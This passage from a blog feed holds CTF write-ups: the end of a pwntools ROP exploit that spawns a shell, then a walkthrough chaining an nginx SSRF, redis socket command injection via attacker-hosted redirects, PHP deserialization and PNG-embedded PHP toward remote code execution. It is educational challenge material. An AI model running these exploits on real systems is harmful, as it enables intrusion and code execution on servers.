class="string">f&quot;bss @ <span class="subst">&#123;<span class="built_in">hex</span>(exe.bss())&#125;</span>&quot;</span>)</span><br><span class="line">    rop = ROP(exe)</span><br><span class="line">    rop.raw(rop.find_gadget([<span class="string">&quot;ret&quot;</span>])) <span class="comment"># movaps issue</span></span><br><span class="line">    rop.call(exe_info, [exe.got[<span class="string">&quot;free&quot;</span>]])</span><br><span class="line">    <span class="comment"># rop.raw(rop.find_gadget([&quot;ret&quot;])) # movaps issue</span></span><br><span class="line">    rop.call(exe_main)</span><br><span class="line"></span><br><span class="line">    leak = rel_write(-<span class="number">0x38</span>, rop.chain())</span><br><span class="line">    leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;free @ <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = leak - libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;libc @ <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop = ROP(libc)</span><br><span class="line">    <span class="comment"># rop.raw(rop.find_gadget([&quot;ret&quot;])) # movaps issue</span></span><br><span class="line">    rop.call(<span class="string">&quot;system&quot;</span>, [<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))])</span><br><span class="line">    rel_write(-<span class="number">0x38</span>, rop.chain(), pwned=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># rel_write(0x1078, rop.chain(), pwned=True)</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &quot; leak stack</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># leak = rel_write(0x1030, b&quot;X&quot;) # remove null byte from filename_hash -&gt; leak</span></span><br><span class="line">    <span class="comment"># if args.GDB:</span></span><br><span class="line">        <span class="comment"># leak = (u64(leak[33:].ljust(8, b&quot;\x00&quot;)) &lt;&lt; 8) | int(input(&quot;byte: &quot;), 16)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">        <span class="comment"># leak = (u64(leak[33:].ljust(8, b&quot;\x00&quot;)) &lt;&lt; 8) | (8 * random.randint(0, 256//8))</span></span><br><span class="line">    <span class="comment"># addr_buffer = leak - 0x11c8</span></span><br><span class="line">    <span class="comment"># print(f&quot;buffer @ &#123;hex(addr_buffer)&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># INS&#123;I_Don&#x27;t_tRu5t_your_Find1nGs!&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> insomnihack2023 </tag>
            
            <tag> 2023 </tag>
            
            <tag> Tek </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB University CTF 2022] Spell Ortserra - Worty</title>
      <link href="/2022/12/05/spellorsterra/"/>
      <url>/2022/12/05/spellorsterra/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>In this challenge, we are given all the source code of the application as well as the configuration files (nginx, docker, …) allowing to deploy it locally.</p><p>The organization of the project is in this form:</p><p><img src="/images/1.png" alt="project"></p><p>So we are dealing with a symfony environment (recognized by the presence of a <code>composer.json</code> and a <code>.env</code> file). Before going to look at the source code of the application and play with PHP, we will take a look at the configuration files. Indeed, in the configuration files, we can notice several things:</p><ul><li><code>readflag</code> : The binary will fetch the flag in &#x2F;root, so we will absolutely need an RCE</li><li><code>redis.conf</code> : There is a redis service, we will probably have to get an SSRF to interact with it</li><li><code>nginx.conf</code> &#x2F; <code>proxy.conf</code> : A reverse proxy has been set up on the application</li></ul><span id="more"></span><p><img src="/images/2.jpg" alt="meme"></p><p>In the redis configuration, we can note the following lines that are not common:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unixsocket /run/redis/redis.sock</span><br><span class="line">unixsocketperm 775</span><br></pre></td></tr></table></figure><p>The redis socket is thus exposed inside the docker, allowing to interact directly with it.</p><p>In the nginx configuration, we can note the following two blocks that are not common:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">location ~ /assets/(.+)/ &#123;</span><br><span class="line">    rewrite ^/assets/(.+)$ /$1 break;</span><br><span class="line"></span><br><span class="line">    resolver 1.1.1.1 ipv6=off valid=30s;</span><br><span class="line">    proxy_set_header Accept-Encoding &quot;&quot;;</span><br><span class="line">    proxy_pass http://$1;</span><br><span class="line">    proxy_set_header User-Agent &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0&quot;;</span><br><span class="line"></span><br><span class="line">    proxy_intercept_errors on;</span><br><span class="line">    error_page 301 302 307 = @handle_redirects;</span><br><span class="line"></span><br><span class="line">    sub_filter_once off;</span><br><span class="line">    sub_filter_types text/css;</span><br><span class="line">    sub_filter &quot;http://$1&quot; &quot;/assets/$1&quot;;</span><br><span class="line">    sub_filter &quot;https://$1&quot; &quot;/assets/$1&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location @handle_redirects &#123;</span><br><span class="line">    resolver 1.1.1.1 ipv6=off valid=30s;</span><br><span class="line"></span><br><span class="line">    set $original_uri $uri;</span><br><span class="line">    add_header X-original-uri $original_uri;</span><br><span class="line">    set $orig_loc $upstream_http_location;</span><br><span class="line"></span><br><span class="line">    proxy_pass $orig_loc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the <code>location ~ /assets/(.+)/</code> directive, there is a first vulnerability: <code>proxy_pass http://$1;</code>, in fact, this directive means that what is passed to the <code>(.+)</code> regex will be used by nginx as a proxy, so it allows to get directly an SSRF ! So we can directly test :</p><p><img src="/images/3.png" alt="ssrf"></p><p>Here, we can see that when we pass <code>127.0.0.1:80</code> in the directive, it returns the web page ! So let’s try to get the redis instance directly !</p><p><img src="/images/4.png" alt="redis_fail"></p><p><img src="/images/5.jpg" alt="meme2"></p><p>Since version 3.7 of redis, the developers have added a security, indeed, if the redis instance, in the request sees the strings <code>POST</code> or <code>Host:</code>, it will interrupt the connection:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10:M 05 Dec 2022 09:23:24.251 - Accepted 127.0.0.1:49606</span><br><span class="line">10:M 05 Dec 2022 09:23:24.251 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.</span><br></pre></td></tr></table></figure><p>So we won’t be able to use the SSRF directly on the redis instance. If we go back to the nginx configuration, we can notice another interesting directive: <code>error_page 301 302 307 = @handle_redirects;</code>, that means that if a web instance responds with a redirection code, it will be up to the <code>handle_redirects</code> block to handle the rest.</p><p>In this block we control more things: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set $orig_loc $upstream_http_location;</span><br><span class="line">proxy_pass $orig_loc;</span><br></pre></td></tr></table></figure><p>If we look at the <code>proxy_pass</code> directive of nginx, we learn that it is possible to interact directly with unix sockets! And this is very interesting, since the configuration of redis has been done in such a way that the redis socket is exposed in the docker! The syntax to do this is quite special: <code>http://unix:/&lt;path to socket&gt;</code>. </p><p>Since we are going to interact with the socket, we will have to see what happens when we try to connect to it, for this I will use the socat binary as a TCP proxy:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/run/redis/</span><br><span class="line"><span class="built_in">mv</span> redis.sock redis.sock.original</span><br><span class="line">socat -t100 -x -v UNIX-LISTEN:/var/run/redis/redis.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/var/run/redis/redis.sock.original</span><br></pre></td></tr></table></figure><p>On an external server, we can create the following PHP script to exploit the vulnerable nginx configuration:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://unix:/var/run/redis/redis.sock&quot;</span>);</span><br></pre></td></tr></table></figure><p>On our socat proxy, we can see the connection being made:</p><p><img src="/images/6.png" alt="socat"></p><p>Now that we can communicate with the socket, we will try to find a way to send arbitrary commands to redis. In the communication, we can see that the header “Host: “ is on the second line, so we’ll have to find a way to send our command on the first line. In the nginx configuration, we notice that in no case it specifies a list of authorized HTTP methods, so we can send any HTTP verb, nginx will accept it.</p><p>Moreover, when we answer in our <code>Location</code> header with a link to the unix socket, it is possible to specify a path on which the socket will interact: <code>http://unix:/var/run/redis/redis.sock:/test</code>, if we send the request back, we observe the following behavior:</p><p><img src="/images/7.png" alt="socat2"></p><p>Here we have a very interesting behavior, indeed, we control both the http method, but also what is passed behind, so we can send any redis command here since we are before the presence of the header “Host:”!</p><p>One last thing to fix is the presence of the string “HTTP&#x2F;1.0”, in fact, redis will trigger an error every time since it will be taken as a parameter of the command that we will pass. To overcome this problem, we will use the “EVAL” command of redis, which allows to execute LUA (in a sandbox).</p><p>The format of the commands that we will send will be :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;redis.call(&lt;what we want&gt;); return ARGV[1]; &quot; 0</span><br></pre></td></tr></table></figure><p>This returns ARGV[1], i.e. <code>HTTP/1.0</code>, so we can now test by trying to create a key “a” with the content “a”, so we modify our PHP script:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://unix:/var/run/redis/redis.sock:&quot;redis.call(\&#x27;SET\&#x27;,\&#x27;a\&#x27;,\&#x27;a\&#x27;); return ARGV[1];&quot; 0 &#x27;</span>);</span><br></pre></td></tr></table></figure><p>To send our orders, we will use the following bash command:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X EVAL http://localhost:1337/assets/146.59.156.82:80/</span><br></pre></td></tr></table></figure><p>And…. tadam:</p><p><img src="/images/8.png" alt="arbitrarycommand"></p><p><img src="/images/9.jpg" alt="meme3"></p><p>So now we have a way to write arbitrary data in the redis instance of the application! So now we have to play with the web application to see how we can use this to get an RCE.</p><p>To connect on the application, the credentials are by default, <code>admin:admin</code>, and we arrive on a kind of game :</p><p><img src="/images/10.png" alt="siteweb"></p><p>When we click on a point, we can take control of it by specifying our email address, and that’s all, there is no other functionality on the application. So we are going to look at the code to see what happens when we “take control” of a point on the map:</p><ul><li>Dans le fichier “AdminController.php”:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span>(<span class="params">Request <span class="variable">$request</span>, ManagerRegistry <span class="variable">$doctrine</span>, MessageBusInterface <span class="variable">$bus</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">[...]</span><br><span class="line">    <span class="variable">$subscribeNotification</span> = <span class="keyword">new</span> <span class="title class_">SubscribeNotification</span>(</span><br><span class="line">        <span class="variable">$subscribe</span>-&gt;email,</span><br><span class="line">        <span class="variable">$subscribe</span>-&gt;uuid,</span><br><span class="line">        <span class="variable">$tracker</span>-&gt;<span class="title function_ invoke__">getXCoordinate</span>(),</span><br><span class="line">        <span class="variable">$tracker</span>-&gt;<span class="title function_ invoke__">getYCoordinate</span>()</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$bus</span>-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$subscribeNotification</span>);</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>Here, we notice that we will create a <code>SubscribeNotification</code> object with the email specified by the user, the uuid of the point and its coordinates. If we create a point, we can notice this in the application logs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">09:51:40 INFO      [messenger] Received message App\Message\SubscribeNotification [&quot;class&quot; =&gt; &quot;App\Message\SubscribeNotification&quot;]</span><br><span class="line">09:51:40 INFO      [messenger] Message App\Message\SubscribeNotification handled by App\MessageHandler\SubscribeNotificationHandler::__invoke [&quot;class&quot; =&gt; &quot;App\Message\SubscribeNotification&quot;,&quot;handler&quot; =&gt; &quot;App\MessageHandler\SubscribeNotificationHandler::__invoke&quot;]</span><br><span class="line">09:51:40 INFO      [messenger] App\Message\SubscribeNotification was handled successfully (acknowledging to transport). [&quot;class&quot; =&gt; &quot;App\Message\SubscribeNotification&quot;]</span><br></pre></td></tr></table></figure><p>In symfony, it’s possible to create “MessageHandler” which allow to listen on a certain class, and when this one is invoked (so created), then the code defined in “MessageHandler” is executed.<br>Moreover, in the application architecture, you may have seen (at the beginning) the file “worker.sh” :</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/ash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 0700 /worker.sh</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    php81 /www/bin/console messenger:consume SendMailTransport --time-limit=60 -vv</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;DEL messages&quot;</span> | redis-cli</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>So we can use the <code>grep</code> command on <code>SendMailTransport</code> to see what it corresponds to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">challenge/config/packages/messenger.yaml:            SendMailTransport: &quot;%env(MESSENGER_TRANSPORT_DSN)%&quot;</span><br><span class="line">challenge/config/packages/messenger.yaml:            &#x27;App\Message\SubscribeNotification&#x27;: SendMailTransport</span><br></pre></td></tr></table></figure><p>If we look in the .env file, the “MESSENGER_TRANSPORT_DSN” variable is initialized to <code>redis://localhost:6379/messages</code>.</p><p><img src="/images/11.jpg" alt="meme4"></p><p>So we can go back to redis to see what happens when we write to a point on the map. In the redis keys, we notice the presence of “messages”, this key is of type “STREAM”, to see what happens in it at the time of writing, we can use the following command: <code>XREAD BLOCK 0 STREAMS messages $</code> :</p><p><img src="/images/12.png" alt="serialization"></p><p>What a surprise! At the time of the message handling, a symfony serialized object is written in redis, allowing the application to send a mail. So we will have to exploit the application via this way, to get our remote code execution.</p><p>Before going to exploit the deserialization via redis, we will follow the following path:</p><ul><li>Modification of the direct PHP code with the values of the variables we want</li><li>Dump the serialization we want to send via the command <code>XREAD BLOCK 0 STREAMS messages $</code>.</li><li>Delete the added code and restart the application</li><li>Direct writing in redis of the payload recovered at step 2 via the XADD command</li><li>Restart the application and write the payload via the miconfiguration of nginx</li></ul><p>We don’t want to be able to use symfony’s gadget, indeed, the version of this one is too recent and no PoC is released yet. We notice the presence of the following class in the serialization : <code>ApplicationMessageSubscribeNotification</code>. This class does not contain much, except four attributes that we have already described above. So we’ll have to make a pop chain to call another class which is potentially vulnerable. After analysis of the files, we choose this one : <code>SubscribeNotificationHandler</code> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubscribeNotificationHandler</span> <span class="keyword">implements</span> <span class="title">MessageHandlerInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$export_file</span>;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$map</span> = <span class="string">&#x27;http://localhost/static/images/clean_map.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stamp</span> = <span class="string">&#x27;http://localhost/static/images/stamp.png&#x27;</span>;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$exportMap</span> = <span class="keyword">new</span> <span class="title class_">MapExportService</span>(</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;uuid,</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;map,</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;stamp,</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;export_file,</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x_coordinate,</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;y_coordinate</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the following explanation, we will have to assume that with deserialization, we control all the parameters of the <code>SubscribeNotificationHandler</code> class, including <code>$map</code> and <code>$stamp</code>.</p><p>The fact that this code is in the magic function <code>__destruct</code> is convenient, because this method is called as soon as an object is destroyed, except that if we create one in our serialization, it will necessarily be destroyed afterwards, so this code will necessarily be called. We will now concentrate on the <code>MapExportService</code> class, and more particularly on the <code>generateMap()</code> method, since this is called by the <code>SubscribeNotificationHandler</code> class:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapExportService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateMap</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Fetch resources</span></span><br><span class="line">        <span class="variable">$mapFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch_image</span>(<span class="variable">$this</span>-&gt;map_url);</span><br><span class="line">        <span class="variable">$stampFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch_image</span>(<span class="variable">$this</span>-&gt;stamp_url);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_image</span>(<span class="variable">$mapFile</span>) || !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_image</span>(<span class="variable">$stampFile</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create Image instances</span></span><br><span class="line">        <span class="variable">$map</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$mapFile</span>);</span><br><span class="line">        <span class="variable">$stamp</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$stampFile</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// add stamp to the tracker coordinates</span></span><br><span class="line">        <span class="title function_ invoke__">imagecopymerge</span>(</span><br><span class="line">            <span class="variable">$map</span>,</span><br><span class="line">            <span class="variable">$stamp</span>,</span><br><span class="line">            <span class="variable">$this</span>-&gt;x_coordinate,</span><br><span class="line">            <span class="variable">$this</span>-&gt;y_coordinate,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">imagesx</span>(<span class="variable">$stamp</span>),</span><br><span class="line">            <span class="title function_ invoke__">imagesy</span>(<span class="variable">$stamp</span>),</span><br><span class="line">            <span class="number">100</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create watermark with details</span></span><br><span class="line">        <span class="variable">$stamp</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">420</span>, <span class="number">115</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">imagefilledrectangle</span>(<span class="variable">$stamp</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">419</span>, <span class="number">115</span>, <span class="number">0x0000FF</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagefilledrectangle</span>(<span class="variable">$stamp</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">410</span>, <span class="number">105</span>, <span class="number">0xFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">imagestring</span>(<span class="variable">$stamp</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="string">&#x27;Track: &#x27;</span> . <span class="variable">$this</span>-&gt;uuid, <span class="number">0x0000FF</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagestring</span>(<span class="variable">$stamp</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="string">&#x27;X-Coordinate: &#x27;</span> . <span class="variable">$this</span>-&gt;x_coordinate, <span class="number">0x0000FF</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagestring</span>(<span class="variable">$stamp</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="string">&#x27;Y-Coordinate: &#x27;</span> . <span class="variable">$this</span>-&gt;y_coordinate, <span class="number">0x0000FF</span>);</span><br><span class="line">        <span class="title function_ invoke__">imagestring</span>(<span class="variable">$stamp</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">80</span>, <span class="string">&#x27;Last Updated: &#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y/m/d H:i:s&quot;</span>), <span class="number">0x0000FF</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the margins for the stamp and get the height/width of the stamp image</span></span><br><span class="line">        <span class="variable">$marge_right</span> = <span class="number">10</span>;</span><br><span class="line">        <span class="variable">$marge_bottom</span> = <span class="number">10</span>;</span><br><span class="line">        <span class="variable">$sx</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$stamp</span>);</span><br><span class="line">        <span class="variable">$sy</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$stamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Merge the stamp onto our map</span></span><br><span class="line">        <span class="title function_ invoke__">imagecopymerge</span>(<span class="variable">$map</span>, <span class="variable">$stamp</span>, <span class="title function_ invoke__">imagesx</span>(<span class="variable">$map</span>) - <span class="number">450</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="title function_ invoke__">imagesx</span>(<span class="variable">$stamp</span>), <span class="title function_ invoke__">imagesy</span>(<span class="variable">$stamp</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Save exported map</span></span><br><span class="line">        <span class="variable">$savePath</span> = <span class="string">&#x27;/www/public/static/exports/&#x27;</span> . <span class="variable language_">$this</span>-&gt;export_file;</span><br><span class="line">        <span class="title function_ invoke__">imagepng</span>(<span class="variable">$map</span>, <span class="variable">$savePath</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This class will be used to get our remote code execution, as the last statement of the <code>generateMap()</code> function is <code>imagepng($map, $savePath);</code>, but we also control the <code>$this-&gt;export_file</code> variable as it is declared in the <code>SubscribeNotificationHandler</code> class.</p><p>Last but not least, this method does a lot of operations on the images it retrieves, which prevents us from using basic code execution techniques in the images (comments, …).<br>To achieve this, I used Synacktiv’s blog on <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">images</a>, and in particular the “IDAT chunk” method, with the following script:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xA3</span>, <span class="number">0x9F</span>, <span class="number">0x67</span>, <span class="number">0xF7</span>, <span class="number">0x0E</span>, <span class="number">0x93</span>, <span class="number">0x1B</span>, <span class="number">0x23</span>, <span class="number">0xBE</span>, <span class="number">0x2C</span>, <span class="number">0x8A</span>, <span class="number">0xD0</span>, <span class="number">0x80</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x22</span>, <span class="number">0xF6</span>, <span class="number">0xD9</span>, <span class="number">0x43</span>, <span class="number">0x5D</span>, <span class="number">0xFB</span>, <span class="number">0xAE</span>, <span class="number">0xCC</span>, <span class="number">0x5A</span>, <span class="number">0x01</span>, <span class="number">0xDC</span>, <span class="number">0xAA</span>, <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0xB6</span>, <span class="number">0xEE</span>, <span class="number">0xBB</span>, <span class="number">0x3A</span>, <span class="number">0xCF</span>, <span class="number">0x93</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x88</span>, <span class="number">0xFC</span>, <span class="number">0x69</span>, <span class="number">0xD0</span>, <span class="number">0x2B</span>, <span class="number">0xB9</span>, <span class="number">0xB0</span>, <span class="number">0xFB</span>, <span class="number">0xBB</span>, <span class="number">0x79</span>, <span class="number">0xFC</span>, <span class="number">0xED</span>, <span class="number">0x22</span>, <span class="number">0x38</span>, <span class="number">0x49</span>, <span class="number">0xD3</span>, <span class="number">0x51</span>, <span class="number">0xB7</span>, <span class="number">0x3F</span>, <span class="number">0x02</span>, <span class="number">0xC2</span>, <span 